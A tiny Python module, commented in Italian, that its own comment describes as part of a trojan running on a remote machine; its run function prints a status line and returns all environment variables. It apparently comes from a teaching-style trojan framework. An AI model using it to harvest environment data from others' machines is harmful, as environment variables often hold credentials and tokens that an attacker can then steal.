
import os


def run(**args):  # recupera le variabili d'ambiente impostate sulla macchina remota in cui il trojan è in esecuzione
    print("[*] In envronment module.")
    return os.environ
